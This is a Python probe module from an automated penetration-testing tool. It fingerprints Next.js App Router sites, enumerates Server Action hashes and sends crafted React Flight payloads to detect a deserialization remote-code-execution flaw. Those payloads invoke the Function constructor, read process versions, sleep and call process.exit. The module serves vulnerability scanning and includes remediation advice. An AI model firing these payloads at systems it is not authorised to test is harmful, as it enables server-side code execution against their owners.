"""Next.js React Server Components (RSC) RCE / deserialization probe.

The differentiator probe. Targets the Server Action dispatcher in the
Next.js App Router, where the `Next-Action` header invokes a function
by hash and the body is parsed as a Flight payload (`$F`, `$D`, `$E`,
`$R` reference markers + JSON). Crafted payloads can reach arbitrary
function execution server-side.

References:
- CVE-2025-66478 (Next.js advisory): RSC dispatcher reaches a constructor
  gadget when the Flight parser deserializes attacker-controlled refs.
- CVE-2025-55182 (Datadog write-up): React2Shell RCE via RSC.
- Praetorian PoC: Flight payload `[1,"$E5",["new","Function","..."]]`.

Four phases, all soft-fail:

  1. Fingerprint. GET /. Look for `_next/static/chunks/app/`,
     `__NEXT_DATA__`, `self.__next_f.push(`, `x-powered-by: Next.js`,
     or `x-nextjs-*` headers. No fingerprint = bail with [].

  2. Enumerate Server Action hashes. Try common build-manifest paths
     and parse SHA-1-shaped (40 hex chars) IDs out of the bodies.
     Fall back to a synthetic placeholder hash so phase 3 still
     fires on common app routes (the route reflection alone tells
     us whether the dispatcher is reachable).

  3. Trigger. For each (route, hash) pair POST a Flight payload with
     the `Next-Action: <hash>` header.

  4. Detect. Severity ladder:
       * 200 + OS-shape strings (linux/x64/node-vN.N.N) -> CRITICAL
       * 200 + node_versions / process.env / echoed Flight markers -> HIGH
       * Sleep payload with elapsed > 5s -> HIGH (blind RCE)
       * 500 + react-server-dom-webpack / Flight parser stack -> MEDIUM

Probe is read-leaning. The canary uses `process.versions` (introspection,
non-destructive) and `process.exit(0)` only as a benign-looking trigger.
No `child_process`, no fs writes, no network egress.
"""
from __future__ import annotations

import asyncio
import logging
import re
from time import monotonic
from typing import Any

from engine.probes import ProbeContext, registry
from engine.probes.primitives import http_get

logger = logging.getLogger("pentest-ai.probes.web.nextjs_rsc_rce")

# Per-request timeout. Sleep payload + slack but bounded.
_REQ_TIMEOUT_S = 6.0
_BLIND_TIME_THRESHOLD_S = 5.0

# Phase 1: fingerprint markers in the root HTML response.
_NEXTJS_BODY_MARKERS: tuple[str, ...] = (
    "_next/static/chunks/app/",
    '<script id="__NEXT_DATA__"',
    "self.__next_f.push(",
    "nextjs.org",
)
_NEXTJS_HEADER_HINTS: tuple[str, ...] = (
    "x-powered-by",
    "x-nextjs-",
)

# Phase 2: build-manifest paths. The first three are vanilla Next.js;
# /.next/server/app/*.json shows up only on misconfigured deploys that
# expose the build dir.
_MANIFEST_PATHS: tuple[str, ...] = (
    "/_next/static/__NEXT_DATA__.json",
    "/_next/server-actions",
    "/_next/static/chunks/",
    "/.next/server/app/page.json",
)

# Common app-router routes that often host Server Actions.
_ACTION_ROUTES: tuple[str, ...] = (
    "/",
    "/api",
    "/actions",
    "/server",
    "/app/actions",
    "/dashboard",
)

# SHA-1 looking hex strings, 40 chars. Server Action IDs are SHA-1
# truncated representations of the export name.
_HASH_RE = re.compile(r"\b([a-f0-9]{40})\b")

# Phase 3: payloads.
#
# Canary (process.versions read): reaches the Flight parser; if the
# server reflects, the body will contain node_versions or v8/openssl
# strings. The Praetorian PoC pattern: `[1,"$E5",["new","Function",...]]`.
_PAYLOAD_PROCESS_VERSIONS: list[Any] = [
    1,
    "$E5",
    ["new", "Function", "return process.versions"],
]
# `$F` reference marker, function-shaped.
_PAYLOAD_F_REF: list[Any] = [{"$F": "process.exit(0)"}]
# `$E` reference marker, OOB canary.
_PAYLOAD_E_REF: list[Any] = [{"$E": "DNS_OOB_canary_ptai"}]
# Sleep payload for blind detection. Wrapped in Function constructor
# gadget; if the server actually evaluates it, it stalls > 5s.
_PAYLOAD_SLEEP: list[Any] = [
    1,
    "$E5",
    [
        "new",
        "Function",
        "return new Promise(r=>setTimeout(r,6000))",
    ],
]

_FLIGHT_PAYLOADS: tuple[tuple[str, list[Any]], tuple[str, list[Any]], tuple[str, list[Any]]] = (
    ("flight_function_ctor", _PAYLOAD_PROCESS_VERSIONS),
    ("flight_F_ref", _PAYLOAD_F_REF),
    ("flight_E_ref", _PAYLOAD_E_REF),
)

# Phase 4: detection markers.
_CRITICAL_BODY_PATTERNS: tuple[re.Pattern[str], ...] = (
    re.compile(r"\bnode-v\d+\.\d+\.\d+\b"),
    re.compile(r"\b(linux|darwin|win32)\b.*\b(x64|arm64)\b", re.DOTALL),
)
_HIGH_BODY_MARKERS: tuple[str, ...] = (
    "node_versions",
    "process.env",
    '"v8"',
    '"openssl"',
    '"$F"',
    '"$E"',
    '"$R"',
    '"$D"',
)
_MEDIUM_BODY_MARKERS: tuple[str, ...] = (
    "react-server-dom-webpack",
    "Flight",
    "decodeReply",
    "decodeAction",
    "parseModelString",
)


def _fingerprint(status: int, headers: dict[str, str], body: str) -> bool:
    """Return True if response looks like a Next.js App Router target."""
    if status == 0:
        return False
    # Header check. Any x-nextjs-* or x-powered-by mentioning Next.js.
    for hk, hv in headers.items():
        hk_l = hk.lower()
        if hk_l.startswith("x-nextjs-"):
            return True
        if hk_l == "x-powered-by" and "next.js" in hv.lower():
            return True
    # Body check.
    return any(marker in body for marker in _NEXTJS_BODY_MARKERS)


def _extract_action_hashes(body: str) -> list[str]:
    """Pull SHA-1-shaped action IDs out of a manifest / chunk body."""
    if not body:
        return []
    seen: set[str] = set()
    out: list[str] = []
    for m in _HASH_RE.findall(body):
        if m not in seen:
            seen.add(m)
            out.append(m)
        if len(out) >= 8:
            break
    return out


async def _enumerate_actions(
    session: Any, base: str
) -> list[str]:
    """Walk manifest paths and collect action hashes. Best-effort."""
    hashes: list[str] = []
    for path in _MANIFEST_PATHS:
        url = base + path
        status, _hdrs, body = await http_get(session, url)
        if status == 200 and body:
            hashes.extend(_extract_action_hashes(body))
    # Dedupe while preserving order.
    seen: set[str] = set()
    deduped = []
    for h in hashes:
        if h not in seen:
            seen.add(h)
            deduped.append(h)
    return deduped


async def _timed_post(
    session: Any, url: str, payload: Any, headers: dict[str, str]
) -> tuple[int, dict[str, str], str, float]:
    """POST with a hard per-request timeout. Returns (status, headers, body, elapsed_s)."""
    start = monotonic()
    try:
        # http_post_json takes a dict; we need to send a list. Build the
        # call directly via the session, mirroring http_post_json's shape
        # so the test mocks work the same way.
        status, hdrs, body = await asyncio.wait_for(
            _post_raw(session, url, payload, headers),
            timeout=_REQ_TIMEOUT_S,
        )
    except asyncio.TimeoutError:
        return 0, {}, "", monotonic() - start
    except Exception as exc:  # noqa: BLE001
        logger.debug("POST %s failed: %s", url, exc)
        return 0, {}, "", monotonic() - start
    return status, hdrs, body, monotonic() - start


async def _post_raw(
    session: Any, url: str, payload: Any, headers: dict[str, str]
) -> tuple[int, dict[str, str], str]:
    """POST a JSON body that may be a list (Flight payloads aren't dicts).

    Mirrors `http_post_json` but accepts non-dict JSON. Uses the same
    aiohttp session.post signature so the existing _make_response mock
    fixture works unchanged.
    """
    h = {"Content-Type": "application/json", "User-Agent": "pentest-ai/0.11"}
    h.update(headers)
    try:
        async with session.post(url, json=payload, headers=h) as resp:
            body = await resp.text(errors="replace")
            return resp.status, {k: v for k, v in resp.headers.items()}, body[:65000]
    except Exception as exc:  # noqa: BLE001
        logger.debug("raw POST %s failed: %s", url, exc)
        return 0, {}, ""


def _classify(
    status: int, body: str, elapsed_s: float
) -> tuple[str, str] | None:
    """Map a response to (severity, evidence) or None."""
    body_lower = body.lower()

    # CRITICAL: explicit OS / Node version leak in the body.
    for pat in _CRITICAL_BODY_PATTERNS:
        m = pat.search(body)
        if m:
            return "critical", f"OS-shape leak via Flight payload: {m.group(0)}"

    # HIGH: blind RCE on a sleep payload.
    if elapsed_s >= _BLIND_TIME_THRESHOLD_S:
        return "high", f"Time-delay RCE: elapsed={elapsed_s:.2f}s"

    # HIGH: process.env / node_versions / Flight markers reflected.
    for marker in _HIGH_BODY_MARKERS:
        if marker in body_lower or marker in body:
            return "high", f"Flight payload reflected: {marker}"

    # MEDIUM: 500 with the RSC parser stack.
    if status == 500:
        for marker in _MEDIUM_BODY_MARKERS:
            if marker in body:
                return "medium", f"RSC parser reachable: {marker}"
    return None


def _emit(target: str, severity: str, evidence: str, variant: str) -> dict[str, Any]:
    return {
        "title": f"Next.js RSC RCE ({variant}) on {target}",
        "severity": severity,
        "category": "injection",
        "target": target,
        "evidence": evidence[:500],
        "bug_class": "rce_deserialization",
        "remediation": (
            "Upgrade Next.js past CVE-2025-66478 / CVE-2025-55182. "
            "Reject Flight payloads containing `$F`/`$E`/`$R` reference "
            "markers from untrusted callers and validate the Next-Action "
            "header against a server-side allowlist."
        ),
    }


@registry.probe(
    name="web.nextjs_rsc_rce",
    bug_class="rce_deserialization",
    severity_max="critical",
    owasp="A08:2021",
    runtime_budget_s=25.0,
    tags=("anonymous", "high-roi", "novel", "destructive-low"),
    requires_auth=False,
)
async def probe_nextjs_rsc_rce(ctx: ProbeContext) -> list[dict[str, Any]]:
    """Four-phase RSC RCE probe. Returns [] cleanly on non-Next.js targets."""
    base = ctx.base.rstrip("/")
    findings: list[dict[str, Any]] = []
    seen: set[tuple[str, str, str]] = set()

    # Phase 1: fingerprint.
    status, headers, body = await http_get(ctx.session, base + "/")
    if not _fingerprint(status, headers, body):
        return []

    # Phase 2: enumerate action hashes. If empty, fall back to a
    # synthetic placeholder so phase 3 still exercises the dispatcher.
    hashes = await _enumerate_actions(ctx.session, base)
    if not hashes:
        # 40-char placeholder; Next.js will 404 on unknown actions but
        # some misconfigured builds still dispatch through the parser.
        hashes = ["0" * 40]

    # Phase 3 & 4: trigger and classify.
    for route in _ACTION_ROUTES:
        url = base + route
        for action_hash in hashes[:3]:  # cap to keep budget bounded
            for variant, payload in _FLIGHT_PAYLOADS:
                hdrs = {"Next-Action": action_hash}
                p_status, _p_hdrs, p_body, p_elapsed = await _timed_post(
                    ctx.session, url, payload, hdrs
                )
                if p_status == 0:
                    continue
                classified = _classify(p_status, p_body, p_elapsed)
                if classified is None:
                    continue
                severity, evidence = classified
                key = (url, severity, variant)
                if key in seen:
                    continue
                seen.add(key)
                findings.append(_emit(url, severity, evidence, variant))
                # Stop hammering this route once we have a hit.
                break

            # Sleep / blind probe last (more expensive).
            hdrs = {"Next-Action": action_hash}
            s_status, _s_hdrs, s_body, s_elapsed = await _timed_post(
                ctx.session, url, _PAYLOAD_SLEEP, hdrs
            )
            if s_status == 0:
                continue
            classified = _classify(s_status, s_body, s_elapsed)
            if classified is None:
                continue
            severity, evidence = classified
            key = (url, severity, "flight_sleep")
            if key in seen:
                continue
            seen.add(key)
            findings.append(_emit(url, severity, evidence, "flight_sleep"))
            break  # one finding per route is enough

    return findings
